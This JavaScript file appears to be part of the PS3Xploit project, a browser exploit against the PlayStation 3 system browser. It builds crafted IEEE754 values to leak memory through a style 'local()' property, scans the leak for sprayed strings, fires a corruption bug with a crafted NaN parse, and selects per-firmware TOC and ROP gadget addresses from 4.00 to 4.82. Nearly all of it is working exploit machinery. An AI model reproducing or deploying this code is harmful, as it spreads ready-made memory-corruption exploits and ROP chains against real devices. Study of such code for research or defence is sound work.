function asciiAt(str, i){
	return str.charCodeAt(i)&0xFF;
}
function str2ascii(str){
	var ascii = "";
	for (var i = 0; i < str.length; i++) {
		ascii += str.charCodeAt(i).toString(16);
	}
	return ascii;
}
function hexToBytes(hex){
	var bytes = [];
    for (var c = 0; c < hex.length; c += 2)
    bytes.push(parseInt(hex.substr(c, 2), 16));
    return bytes;
}
function Repeat(s, n){
	var a = [];
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}
function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	str = half.toString(16);
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;
	}
	
	return unescape(str);
}
function hexw2bin(hex_val)
{
	return "" + hexh2bin(hex_val >> 16)+ "" + hexh2bin(hex_val);
}
function s2hex(str){
	var str_ret = '';
	for (var i = 0; i < str.length; i++)
	{
		if(str.charCodeAt(i)==0){
			str_ret+=hex8((str.charCodeAt(i) >>> 4).toString(16));
			str_ret+=hex8((str.charCodeAt(i) & 0xF).toString(16));
		}
		else
		{
			str_ret+=(str.charCodeAt(i) >>> 4).toString(16);
			str_ret+=(str.charCodeAt(i) & 0xF).toString(16);
		}
	}
	return str_ret;
}
function bytesToHex(str){
	var hex = [];
    for (var  i = 0; i < str.length; i++) {
		if(str.charCodeAt(i)==0){
			hex.push(hex8((str.charCodeAt(i) >>> 4).toString(16)));
			hex.push(hex8((str.charCodeAt(i) & 0xF).toString(16)));
		}
		else
		{
			hex.push((str.charCodeAt(i) >>> 4).toString(16));
			hex.push((str.charCodeAt(i) & 0xF).toString(16));
		}
    }
	return hex.join("");
}
function hex32(s){
	return ('00000000' + s).substr(-8);
}
function hex16(s){
	return ('0000' + s).slice(-4)
}
function hex8(s){
	return ('00' + s).substr(-2);
}
function sleep(milliseconds){
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}

function logAdd(txt,_log){
	if(!_log) return;
	var div = document.createElement("div");
	div.innerHTML = txt;
	_log.appendChild(div);
}
function logEntry(){
		var _logger = document.getElementById("log");
		while (_logger.firstChild) {_logger.removeChild(_logger.firstChild);}
		if (!_logger) return 0;
		var logger = document.createElement("div");
		if (_logger.hasChildNodes()){
			_logger.insertBefore(logger, _logger.firstChild);
		}else{
			_logger.appendChild(logger);
		}
		return logger;
}

function writeEnvInfo(__log_div){
	__log_div.innerHTML="<hr><h3>PS3 System Browser Info:</h3><br>"+navigator.userAgent+"<br>"+navigator.appName+" (" + navigator.platform + ")<br>"+new Date().toTimeString() + "<br>";
}
function setCharAt(str,index,chr){
	if(index > str.length-1) return str;
	return str.substr(0,index) + chr + str.substr(index+1);
}
String.prototype.replaceAt=function(index, ch){
	return this.substr(0, index) + ch + this.substr(index+ch.length);
}

//#########################################################################################################################################################################

Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length== 1) return data[0]; 
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign + '0.';
        while(mag++) z += '0';
        return z + str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) z += '0';
    return str + z;
}
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber = 0;
	var bits = [];
	for (var i = bytes.length; i; i -= 1)
	{
		var byte = bytes[i - 1];
		for (var j = 8; j; j -= 1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}

function readMemory(exploit, address, size)
{
	var str = "local(" + generateExploit(address, size) + ")";
	exploit.style.src = str;
	return exploit.style.src;
}

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len,_log_div)
{
	try
	{
		var dat=readMemory(document.getElementById('exploit'),search_base,search_size).substr(6,search_size);
		for (var i=0;i<(search_size*2);i+=0x10)	{
			if (dat.charCodeAt(i/2)==pattern)
			{
				var match=0;
				for (var k=0;k<(len*2);k+=0x2)
				{
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					match+=1;
				}
				if (match==len)
				{
					var exploit_addr=search_base+i+2;
					//logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16)+"<br>"+bytesToHex(exploit_data),_log_div);	
					
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		var end_range = search_base+search_size;
		//logAdd("The string variable named "+name+" could not be located in range 0x"+search_base.toString(16)+" - 0x"+end_range.toString(16), _log_div);
		return 0;
	} 
	catch(e) 
	{
		logAdd(e, _log_div);
	}
}
function trigger(exploit_addr){
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

//####################################################################################################################################################################
function ps3chk(){
	var isPlaystation = false;
	var disableFeatures = false;
	var ua = navigator.userAgent;
	var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
	var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
	var msgCongrats = "Congratulations! We've detected your PlayStation 3 is running FW " + fwVersion + ", which is compatible with PS3Xploit! Enjoy!";
	
	switch (uaStringCheck) {
		case "PLAYSTATION":
			isPlaystation = true;
			break;

		default:
			alert("You are not on a PlayStation System! All features have been disabled");
			disableFeatures = true;
			isPlaystation = false;
			document.getElementById("load-rop").disabled=true;
			break;
	}


	if (isPlaystation) {
		switch (fwVersion) {
			case fwCompat[0]:
			   alert(msgCongrats);
				toc_addr = toc_addr_400;
				gadget1_addr=gadget1_addr_400;
				gadget2_addr=gadget2_addr_400;
				gadget3_addr=gadget3_addr_400;
				gadget4_addr=gadget4_addr_400;
				gadget5_addr=gadget5_addr_400;
				gadget6_addr=gadget6_addr_400;
				gadget7_addr=gadget7_addr_400;
				gadget8_addr=gadget8_addr_400;
				break;
				
			case fwCompat[1]:
			   alert(msgCongrats);
				toc_addr = toc_addr_410;
				gadget1_addr=gadget1_addr_410;
				gadget2_addr=gadget2_addr_410;
				gadget3_addr=gadget3_addr_410;
				gadget4_addr=gadget4_addr_410;
				gadget5_addr=gadget5_addr_410;
				gadget6_addr=gadget6_addr_410;
				gadget7_addr=gadget7_addr_410;
				gadget8_addr=gadget8_addr_410;
				break;
				
			case fwCompat[2]:
			   alert(msgCongrats);
				toc_addr = toc_addr_411;
				gadget1_addr=gadget1_addr_411;
				gadget2_addr=gadget2_addr_411;
				gadget3_addr=gadget3_addr_411;
				gadget4_addr=gadget4_addr_411;
				gadget5_addr=gadget5_addr_411;
				gadget6_addr=gadget6_addr_411;
				gadget7_addr=gadget7_addr_411;
				gadget8_addr=gadget8_addr_411;
				break;
				
			case fwCompat[3]:
			   alert(msgCongrats);
				toc_addr = toc_addr_420;
				gadget1_addr=gadget1_addr_420;
				gadget2_addr=gadget2_addr_420;
				gadget3_addr=gadget3_addr_420;
				gadget4_addr=gadget4_addr_420;
				gadget5_addr=gadget5_addr_420;
				gadget6_addr=gadget6_addr_420;
				gadget7_addr=gadget7_addr_420;
				gadget8_addr=gadget8_addr_420;
				break;
				
			case fwCompat[4]:
			   alert(msgCongrats);
				toc_addr = toc_addr_421;
				gadget1_addr=gadget1_addr_421;
				gadget2_addr=gadget2_addr_421;
				gadget3_addr=gadget3_addr_421;
				gadget4_addr=gadget4_addr_421;
				gadget5_addr=gadget5_addr_421;
				gadget6_addr=gadget6_addr_421;
				gadget7_addr=gadget7_addr_421;
				gadget8_addr=gadget8_addr_421;
				break;
				
			case fwCompat[5]:
			   alert(msgCongrats);
				toc_addr = toc_addr_425;
				gadget1_addr=gadget1_addr_425;
				gadget2_addr=gadget2_addr_425;
				gadget3_addr=gadget3_addr_425;
				gadget4_addr=gadget4_addr_425;
				gadget5_addr=gadget5_addr_425;
				gadget6_addr=gadget6_addr_425;
				gadget7_addr=gadget7_addr_425;
				gadget8_addr=gadget8_addr_425;
				break;
				
			case fwCompat[6]:
			   alert(msgCongrats);
				toc_addr = toc_addr_430;
				gadget1_addr=gadget1_addr_430;
				gadget2_addr=gadget2_addr_430;
				gadget3_addr=gadget3_addr_430;
				gadget4_addr=gadget4_addr_430;
				gadget5_addr=gadget5_addr_430;
				gadget6_addr=gadget6_addr_430;
				gadget7_addr=gadget7_addr_430;
				gadget8_addr=gadget8_addr_430;
				break;
				
			case fwCompat[7]:
			   alert(msgCongrats);
				toc_addr = toc_addr_431;
				gadget1_addr=gadget1_addr_431;
				gadget2_addr=gadget2_addr_431;
				gadget3_addr=gadget3_addr_431;
				gadget4_addr=gadget4_addr_431;
				gadget5_addr=gadget5_addr_431;
				gadget6_addr=gadget6_addr_431;
				gadget7_addr=gadget7_addr_431;
				gadget8_addr=gadget8_addr_431;
				break;
				
			case fwCompat[8]:
			   alert(msgCongrats);
				toc_addr = toc_addr_440;
				gadget1_addr=gadget1_addr_440;
				gadget2_addr=gadget2_addr_440;
				gadget3_addr=gadget3_addr_440;
				gadget4_addr=gadget4_addr_440;
				gadget5_addr=gadget5_addr_440;
				gadget6_addr=gadget6_addr_440;
				gadget7_addr=gadget7_addr_440;
				gadget8_addr=gadget8_addr_440;
				break;
				
			case fwCompat[9]:
			   alert(msgCongrats);
				toc_addr = toc_addr_441;
				gadget1_addr=gadget1_addr_441;
				gadget2_addr=gadget2_addr_441;
				gadget3_addr=gadget3_addr_441;
				gadget4_addr=gadget4_addr_441;
				gadget5_addr=gadget5_addr_441;
				gadget6_addr=gadget6_addr_441;
				gadget7_addr=gadget7_addr_441;
				gadget8_addr=gadget8_addr_441;
				break;
				
			case fwCompat[10]:
			   alert(msgCongrats);
				toc_addr = toc_addr_445;
				gadget1_addr=gadget1_addr_445;
				gadget2_addr=gadget2_addr_445;
				gadget3_addr=gadget3_addr_445;
				gadget4_addr=gadget4_addr_445;
				gadget5_addr=gadget5_addr_445;
				gadget6_addr=gadget6_addr_445;
				gadget7_addr=gadget7_addr_445;
				gadget8_addr=gadget8_addr_445;
				break;
				
			case fwCompat[11]:
			   alert(msgCongrats);
				toc_addr = toc_addr_446;
				gadget1_addr=gadget1_addr_446;
				gadget2_addr=gadget2_addr_446;
				gadget3_addr=gadget3_addr_446;
				gadget4_addr=gadget4_addr_446;
				gadget5_addr=gadget5_addr_446;
				gadget6_addr=gadget6_addr_446;
				gadget7_addr=gadget7_addr_446;
				gadget8_addr=gadget8_addr_446;
				break;
				
			case fwCompat[12]:
			   alert(msgCongrats);
				toc_addr = toc_addr_450;
				gadget1_addr=gadget1_addr_450;
				gadget2_addr=gadget2_addr_450;
				gadget3_addr=gadget3_addr_450;
				gadget4_addr=gadget4_addr_450;
				gadget5_addr=gadget5_addr_450;
				gadget6_addr=gadget6_addr_450;
				gadget7_addr=gadget7_addr_450;
				gadget8_addr=gadget8_addr_450;
				break;
				
			case fwCompat[13]:
			   alert(msgCongrats);
				toc_addr = toc_addr_453;
				gadget1_addr=gadget1_addr_453;
				gadget2_addr=gadget2_addr_453;
				gadget3_addr=gadget3_addr_453;
				gadget4_addr=gadget4_addr_453;
				gadget5_addr=gadget5_addr_453;
				gadget6_addr=gadget6_addr_453;
				gadget7_addr=gadget7_addr_453;
				gadget8_addr=gadget8_addr_453;
				break;
				
			case fwCompat[14]:
			   alert(msgCongrats);
				toc_addr = toc_addr_455;
				gadget1_addr=gadget1_addr_455;
				gadget2_addr=gadget2_addr_455;
				gadget3_addr=gadget3_addr_455;
				gadget4_addr=gadget4_addr_455;
				gadget5_addr=gadget5_addr_455;
				gadget6_addr=gadget6_addr_455;
				gadget7_addr=gadget7_addr_455;
				gadget8_addr=gadget8_addr_455;
				break;
				
			case fwCompat[15]:
			   alert(msgCongrats);
				toc_addr = toc_addr_460;
				gadget1_addr=gadget1_addr_460;
				gadget2_addr=gadget2_addr_460;
				gadget3_addr=gadget3_addr_460;
				gadget4_addr=gadget4_addr_460;
				gadget5_addr=gadget5_addr_460;
				gadget6_addr=gadget6_addr_460;
				gadget7_addr=gadget7_addr_460;
				gadget8_addr=gadget8_addr_460;
				break;
				
			case fwCompat[16]:
			   alert(msgCongrats);
				toc_addr = toc_addr_465;
				gadget1_addr=gadget1_addr_465;
				gadget2_addr=gadget2_addr_465;
				gadget3_addr=gadget3_addr_465;
				gadget4_addr=gadget4_addr_465;
				gadget5_addr=gadget5_addr_465;
				gadget6_addr=gadget6_addr_465;
				gadget7_addr=gadget7_addr_465;
				gadget8_addr=gadget8_addr_465;
				break;
				
			case fwCompat[17]:
			   alert(msgCongrats);
				toc_addr = toc_addr_466;
				gadget1_addr=gadget1_addr_466;
				gadget2_addr=gadget2_addr_466;
				gadget3_addr=gadget3_addr_466;
				gadget4_addr=gadget4_addr_466;
				gadget5_addr=gadget5_addr_466;
				gadget6_addr=gadget6_addr_466;
				gadget7_addr=gadget7_addr_466;
				gadget8_addr=gadget8_addr_466;
				break;
				
			case fwCompat[18]:
			   alert(msgCongrats);
				toc_addr = toc_addr_470;
				gadget1_addr=gadget1_addr_470;
				gadget2_addr=gadget2_addr_470;
				gadget3_addr=gadget3_addr_470;
				gadget4_addr=gadget4_addr_470;
				gadget5_addr=gadget5_addr_470;
				gadget6_addr=gadget6_addr_470;
				gadget7_addr=gadget7_addr_470;
				gadget8_addr=gadget8_addr_470;
				break;
				
			case fwCompat[19]:
			   alert(msgCongrats);
				toc_addr = toc_addr_475;
				gadget1_addr=gadget1_addr_475;
				gadget2_addr=gadget2_addr_475;
				gadget3_addr=gadget3_addr_475;
				gadget4_addr=gadget4_addr_475;
				gadget5_addr=gadget5_addr_475;
				gadget6_addr=gadget6_addr_475;
				gadget7_addr=gadget7_addr_475;
				gadget8_addr=gadget8_addr_475;
				break;
				
			case fwCompat[20]:
			   alert(msgCongrats);
				toc_addr = toc_addr_476;
				gadget1_addr=gadget1_addr_476;
				gadget2_addr=gadget2_addr_476;
				gadget3_addr=gadget3_addr_476;
				gadget4_addr=gadget4_addr_476;
				gadget5_addr=gadget5_addr_476;
				gadget6_addr=gadget6_addr_476;
				gadget7_addr=gadget7_addr_476;
				gadget8_addr=gadget8_addr_476;
				break;
				
			case fwCompat[21]:
			   alert(msgCongrats);
				toc_addr = toc_addr_478;
				gadget1_addr=gadget1_addr_478;
				gadget2_addr=gadget2_addr_478;
				gadget3_addr=gadget3_addr_478;
				gadget4_addr=gadget4_addr_478;
				gadget5_addr=gadget5_addr_478;
				gadget6_addr=gadget6_addr_478;
				gadget7_addr=gadget7_addr_478;
				gadget8_addr=gadget8_addr_478;
				break;
				
			case fwCompat[22]:
			   alert(msgCongrats);
				toc_addr = toc_addr_480;
				gadget1_addr=gadget1_addr_480;
				gadget2_addr=gadget2_addr_480;
				gadget3_addr=gadget3_addr_480;
				gadget4_addr=gadget4_addr_480;
				gadget5_addr=gadget5_addr_480;
				gadget6_addr=gadget6_addr_480;
				gadget7_addr=gadget7_addr_480;
				gadget8_addr=gadget8_addr_480;
				break;
				
			case fwCompat[23]:
			   alert(msgCongrats);
				toc_addr = toc_addr_481;
				gadget1_addr=gadget1_addr_481;
				gadget2_addr=gadget2_addr_481;
				gadget3_addr=gadget3_addr_481;
				gadget4_addr=gadget4_addr_481;
				gadget5_addr=gadget5_addr_481;
				gadget6_addr=gadget6_addr_481;
				gadget7_addr=gadget7_addr_481;
				gadget8_addr=gadget8_addr_481;
				break;
				
			case fwCompat[24]:
			   alert(msgCongrats);
			    toc_addr = toc_addr_482;
				gadget1_addr=gadget1_addr_482;
				gadget2_addr=gadget2_addr_482;
				gadget3_addr=gadget3_addr_482;
				gadget4_addr=gadget4_addr_482;
				gadget5_addr=gadget5_addr_482;
				gadget6_addr=gadget6_addr_482;
				gadget7_addr=gadget7_addr_482;
				gadget8_addr=gadget8_addr_482;
				break;
				
			default:
				alert("Your PS3 is not on FW 4.81 or 4.82! Your current running FW version is " + fwVersion + ", which is not compatible with PS3Xploit. All features have been disabled");
				disableFeatures = true;
				document.getElementById("load-rop").disabled=true;
				break;
		}
	}
}
